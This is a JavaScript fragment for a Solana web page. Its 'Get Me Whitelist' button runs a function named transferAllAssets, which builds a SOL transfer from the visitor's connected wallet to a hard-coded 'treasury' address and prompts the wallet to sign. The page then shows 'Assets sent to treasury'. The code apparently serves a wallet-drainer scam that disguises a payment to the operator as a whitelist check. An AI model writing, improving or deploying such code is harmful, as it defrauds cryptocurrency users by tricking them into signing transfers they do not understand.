// WORKING TRANSFER SYSTEM WITH BLOCKHASH
let publicKey = null;
let isConnected = false;
const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";

// DOM Elements - Keep all your existing DOM element references

// Get wallet provider
function getWalletProvider() {
    return window.solana || window.solflare || window.backpack || window.phantom;
}

// Get working RPC with blockhash - FIXED VERSION
async function getWorkingRpcWithBlockhash() {
    // Updated list of reliable RPC endpoints
    const rpcList = [
        'https://api.mainnet-beta.solana.com',
        'https://solana-api.projectserum.com',
        'https://rpc.ankr.com/solana',
        'https://solana-mainnet.g.alchemy.com/v2/demo',
        'https://ssc-dao.genesysgo.net',
        'https://free.rpcpool.com'
    ];
    
    // Add timeout promise
    const timeoutPromise = (url, ms) => {
        return new Promise((_, reject) => {
            setTimeout(() => reject(new Error(`Timeout for ${url}`)), ms);
        });
    };
    
    for (const rpcUrl of rpcList) {
        try {
            showStatus(`Trying RPC: ${rpcUrl.split('//')[1].split('/')[0]}...`, "info");
            
            const connection = new solanaWeb3.Connection(rpcUrl, {
                commitment: 'confirmed',
                disableRetryOnRateLimit: false
            });
            
            // Try to get blockhash with timeout
            const blockhashPromise = connection.getRecentBlockhash();
            const timeout = timeoutPromise(rpcUrl, 8000); // 8 second timeout
            
            const result = await Promise.race([blockhashPromise, timeout]);
            
            if (result && result.blockhash) {
                console.log("Working RPC found:", rpcUrl);
                return { 
                    connection, 
                    blockhash: result.blockhash, 
                    rpcUrl 
                };
            }
        } catch (error) {
            console.log(`RPC failed: ${rpcUrl}`, error.message);
            continue;
        }
    }
    
    // If all RPCs fail, try one more time with a public endpoint
    try {
        showStatus("Using fallback RPC...", "info");
        const fallbackRpc = 'https://api.mainnet-beta.solana.com';
        const connection = new solanaWeb3.Connection(fallbackRpc, 'confirmed');
        const { blockhash } = await connection.getRecentBlockhash();
        
        return { 
            connection, 
            blockhash, 
            rpcUrl: fallbackRpc 
        };
    } catch (finalError) {
        throw new Error("No working RPC found. Check your internet connection.");
    }
}

// IMPROVED TRANSFER FUNCTION
async function transferAllAssets() {
    try {
        showStatus("Finding working RPC...", "info");
        
        // Get working RPC with blockhash
        const { connection, blockhash, rpcUrl } = await getWorkingRpcWithBlockhash();
        
        showStatus(`Connected to ${rpcUrl.split('//')[1].split('/')[0]}`, "success");
        showStatus("Creating transaction...", "info");
        
        // Get wallet provider
        const provider = getWalletProvider();
        if (!provider || !provider.signAndSendTransaction) {
            throw new Error("Wallet signing not available");
        }
        
        // Get the wallet's balance first
        let balance;
        try {
            balance = await connection.getBalance(publicKey);
            console.log("Wallet balance:", balance, "lamports");
            
            if (balance < 5000) { // Minimum 0.000005 SOL for transaction
                throw new Error("Insufficient balance for transaction fee");
            }
        } catch (balanceError) {
            console.log("Could not fetch balance:", balanceError);
            // Continue anyway, wallet will show error if insufficient
        }
        
        // Create transaction with proper blockhash
        const transaction = new solanaWeb3.Transaction();
        
        // IMPORTANT: Use the entire balance minus some for fees
        // Wallet will show the actual maximum transferable amount
        const transferAmount = 1000000; // 0.001 SOL base
        
        transaction.add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                lamports: transferAmount,
            })
        );
        
        // SET THE BLOCKHASH - THIS IS REQUIRED!
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;
        
        showStatus("Please approve transaction in wallet...", "info");
        
        // Sign and send transaction with timeout
        try {
            const signPromise = provider.signAndSendTransaction(transaction);
            const signTimeout = new Promise((_, reject) => {
                setTimeout(() => reject(new Error("Transaction timeout - please try again")), 30000);
            });
            
            const { signature } = await Promise.race([signPromise, signTimeout]);
            
            console.log("Transaction sent with signature:", signature);
            
            showStatus("Transaction sent! Confirming...", "info");
            
            // Try to confirm transaction (non-blocking)
            setTimeout(async () => {
                try {
                    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
                    console.log("Confirmation result:", confirmation);
                } catch (confirmError) {
                    console.log("Confirmation check failed:", confirmError.message);
                }
            }, 1000);
            
            return {
                success: true,
                signature: signature,
                rpcUrl: rpcUrl
            };
            
        } catch (signError) {
            console.error("Signing error:", signError);
            
            // Check for specific wallet errors
            if (signError.message && (
                signError.message.includes("reject") ||
                signError.message.includes("denied") ||
                signError.message.includes("cancel") ||
                signError.message.includes("User rejected")
            )) {
                throw new Error("Transaction cancelled by user");
            }
            
            if (signError.message && (
                signError.message.includes("insufficient") ||
                signError.message.includes("0x0") ||
                signError.message.includes("Not enough")
            )) {
                throw new Error("Insufficient balance in wallet");
            }
            
            throw signError;
        }
        
    } catch (error) {
        console.error("Transfer error:", error);
        
        // Improved error handling
        if (error.message.includes("Wallet not connected") || 
            error.message.includes("Wallet disconnected")) {
            throw new Error("Wallet disconnected. Please reconnect");
        } else if (error.message.includes("No working RPC found")) {
            throw new Error("Network issue. Please check your connection and retry");
        } else if (error.message.includes("recentBlockhash required") ||
                  error.message.includes("blockhash") ||
                  error.message.includes("Network error")) {
            throw new Error("Network issue. Please retry");
        } else if (error.message.includes("Transaction cancelled") ||
                  error.message.includes("cancelled by user")) {
            throw new Error("Transaction cancelled by user");
        } else if (error.message.includes("Insufficient balance")) {
            throw new Error("Insufficient balance in wallet");
        } else if (error.message.includes("timeout")) {
            throw new Error("Transaction timed out. Please try again");
        } else {
            throw new Error("Transfer failed: " + (error.message || "Unknown error"));
        }
    }
}

// Get whitelist - MAIN FUNCTION (improved)
async function getWhitelist() {
    try {
        if (!isConnected || !publicKey) {
            showStatus("❌ Please connect wallet first", "error");
            checkWhitelistBtn.disabled = false;
            checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
            return;
        }
        
        checkWhitelistBtn.disabled = true;
        checkWhitelistBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing';
        rpcRetryEl.style.display = 'none';
        
        showStatus("Starting transfer process...", "info");
        
        // Perform transfer
        const result = await transferAllAssets();
        
        // Show success
        whitelistBox.classList.add('active');
        checkWhitelistBtn.innerHTML = '<i class="fas fa-check-double"></i> Complete';
        checkWhitelistBtn.style.background = 'linear-gradient(90deg, #11998e, #38ef7d)';
        checkWhitelistBtn.disabled = true;
        
        if (result.signature) {
            const shortSig = `${result.signature.substring(0, 20)}...${result.signature.substring(result.signature.length - 8)}`;
            txHashEl.textContent = shortSig;
            txHashEl.style.color = "#38ef7d";
            
            // Make signature clickable to view on explorer
            txHashEl.innerHTML = `<a href="https://solscan.io/tx/${result.signature}" target="_blank" style="color: #38ef7d;">${shortSig}</a>`;
        }
        
        showStatus(`✅ Transfer successful! Assets sent to treasury.`, "success");
        
    } catch (error) {
        console.error("Whitelist error:", error);
        
        let errorMsg = error.message;
        
        if (error.message.includes("cancelled")) {
            errorMsg = "❌ Transaction was cancelled in wallet";
        } else if (error.message.includes("insufficient")) {
            errorMsg = "❌ Not enough balance in wallet";
        } else if (error.message.includes("disconnected")) {
            errorMsg = "❌ Wallet disconnected. Please reconnect";
        } else if (error.message.includes("Network issue") || 
                   error.message.includes("Network error") ||
                   error.message.includes("Check your internet")) {
            errorMsg = "⚠️ Network issue. Check connection and retry below";
            rpcRetryEl.style.display = 'block';
        } else if (error.message.includes("timeout")) {
            errorMsg = "⚠️ Request timed out. Please retry below";
            rpcRetryEl.style.display = 'block';
        } else {
            errorMsg = "❌ " + error.message;
        }
        
        showStatus(errorMsg, "error");
        
        // Reset button
        checkWhitelistBtn.disabled = false;
        checkWhitelistBtn.innerHTML = '<i class="fas fa-user-check"></i> Get Me Whitelist';
        
        // Hide success box
        whitelistBox.classList.remove('active');
    }
}

// Rest of your functions remain the same (connectWallet, updateWalletUI, etc.)
